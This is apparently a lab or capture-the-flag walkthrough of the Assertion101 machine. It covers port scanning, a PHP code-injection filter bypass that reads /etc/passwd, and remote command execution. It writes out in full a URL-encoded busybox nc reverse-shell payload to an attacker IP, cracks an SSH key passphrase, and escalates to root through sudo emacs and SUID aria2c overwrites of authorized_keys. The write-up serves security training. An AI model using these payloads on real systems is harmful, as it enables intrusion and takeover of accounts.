Assertion101

Target IP: 192.168.136.94
Challenge Description: N/A.

Reconnaissance


Performing a TCP port scan using the command sudo nmap -sS 192.168.136.94 -p- returns the result shown in the image above. There are two TCP ports open on the target machine: SSH and HTTP on their standard ports. Time to perform an aggressive scan against these ports to identify more information.


Running an aggressive scan using the command sudo nmap -sV -A 192.168.136.94 -p 22,80 returns the result shown in the image above. The target machine seems to be running OpenSSH 7.6p1 Ubuntu SSH on port 22, and Apache httpd 2.4.29 as the web server on port 80. The title of the web application on port 80 is Assertion.


Performing a basic web server scan using nikto -h http://192.168.136.94 returns the result shown in the image above. The scan successfully detected some interesting directories such as /pages/.

Enumeration

Port 80: HTTP

I performed a directory search using the command feroxbuster -u http://192.168.136.94 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,jpeg,zip -d 4 --scan-dir-listings and obtained the interesting entries shown in the image above. Again, the /pages/ directory sounds interesting as they are the different pages in the website.


The webpage above is returned for this web application on port 80. I notice the interesting parameter name page in the URL. The different pages are loaded using this same parameter. Usually, this is not a good idea as it could be vulnerable to directory traversal or even Local File Inclusion (LFI) attacks. Time to test it.


Trying to perform a directory traversal attack to read the /etc/passwd file returns the result shown in the image above. The error message Not so easy brother! is returned. This means the input is blocked by some sort of filter in place. I tried to bypass the filter in place using different techniques such as double-encoding (e.g. ...//....//etc/passwd), URL encoding, etc., but I had no luck. I used PHP filters too, but I had no luck. Since the filter is in place, maybe we can exploit the weakness.

Exploitation

Owning the Web Application via Traversal Attacks & Remote Command Execution

And bingo. One of the payload is to bypass the filters in place is using code injection if the input is not sanitised very well. To bypass this, the payload ' and die(highlight_file('/etc/passwd')) or ' is used to read the /etc/passwd file as shown in the image above. There are three users in the system: root, soz, and fnx. Using the same payload, I tried to read the SSH key of users soz and fnx, but I had no luck. Time to perform code execution instead on the remote machine.


To perform command execution, the payload ' and die(system("id")) or ' is used. And this is successful as the user www-data is shown. Time to obtain a reverse shell connection now.


Obtaining a reverse shell connection is straight forward. I started a listener on my machine at port 8443. Then I deployed the URL encoded busybox reverse shell payload %27%20and%20die(system(%22busybox%20nc%20192.168.45.206%208443%20-e%20/bin/bash%22))%20or%20%27. The full URL with the payload is http://192.168.136.94/index.php?page=%27%20and%20die(system(%22busybox%20nc%20192.168.45.206%208443%20-e%20/bin/bash%22))%20or%20%27. And I instantly obtained a reverse shell connection after. I upgraded my shell to an interactive tty one using the command python3 -c 'import pty; pty.spawn("/bin/bash");'. Now I have a foothold on the target machine as the user www-data as shown in the image above.

Privilege Escalation

Horizontal Privilege Escalation: User www-data to User soz via Saved SSH Key

After landing a shell on the target machine, I ran the command ls -la to check the contents in the current directory and obtained the result shown in the image above. There is a directory by the name .todeletelater at the /var/www/html/. And inside this directory, there is a file called id_rsa.


The content of the id_rsa is shown above. This looks like an SSH key. I saved this to my machine with the name as id_rsa. Then I ran the command ssh2john id_rsa > hash to obtain the passphrase set on the SSH key.


Afterwards, I ran the command john hash --wordlist=/usr/share/wordlists/rockyou.txt to obtain the passphrase. I successfully obtained the passphrase sozefasalshwamra as shown in the image above.


Then I changed the permission of the id_rsa file to make it protected using the command chmod 400 id_rsa. Since the SSH is open, I ran the command ssh soz@192.168.136.94 -i id_rsa to connect to the target machine as the user soz using the new SSH key as shown in the image above. Now I have a foothold on the target machine.

Horizontal Privilege Escalation: User soz to User fnx via emacs Sudo Misconfiguration (Overwrite SSH Key)


Running the command sudo -l as the user soz returns the result shown in the image above. It is possible to run the binary /usr/bin/emacs as the user fnx without even entering their password. This binary emacs is a text editor. Maybe I can abuse this sudo misconfiguration to overwrite the SSH key of user fnx to perform horizontal privilege escalation?


On my machine, I generated a new SSH key pair using the command ssh-keygen and saved it as fnx. Then I ran the command sudo -u fnx /usr/bin/emacs /home/fnx/.ssh/authorized_keys to create a new file that would write my SSH key over at /home/fnx/.ssh/authorized_keys. I just copy and pasted the contents from the fnx.pub using emacs as shown in the top-left terminal. To save the content, I pressed the buttons CTRL + X and CTRL + C, and y to confirm.


Then I changed the key permission to protected using the command chmod 400 fnx. And finally, I connected as the user fnx to the target machine by running the command ssh fnx@192.168.136.94 -i fnx and got a hit. I successfully elevated my privileges on the target machine horizontally from the user soz to fnx. Time to obtain root access.

Vertical Privilege Escalation: User fnx to User root via SSH Key Overwrite Using aria2c

Running the command find / -perm -u=s -type f 2>/dev/null shows the binary /usr/bin/aria2c has SUID bit set. This means this binary has higher privileges and can be abused.


Running the command /usr/bin/aria2c --help shows it is possible to download files using this binary, as shown in the image above. The privilege escalation vector of overwriting the user root SSH with mine.


In the image above, on the bottom terminal, I generated an SSH key pair using the command ssh-keygen. I saved the key as root on my machine. Then I changed the permission of the SSH key to protected using the command chmod 400 root. Then I started a Python HTTP server on my machine at port 8080 to serve this file to the target machine. On the top terminal in the image above, I executed the command /usr/bin/aria2c -d /root/.ssh/ -o authorized_keys "http://192.168.45.206:8080/root.pub" --allow-overwrite=true to download the newly generated SSH key on my machine to overwrite the SSH key belonging to the user root. I had to ensure the --allow-overwrite=true too, as it did not work without it.


And bingo. That's a root shell access. Using the new SSH key I connected to the target machine using the command ssh root@192.168.136.94 -i root and gained access. Now I have root privileges on the target machine :) The privilege escalation vectors consisted of overwriting SSH keys.
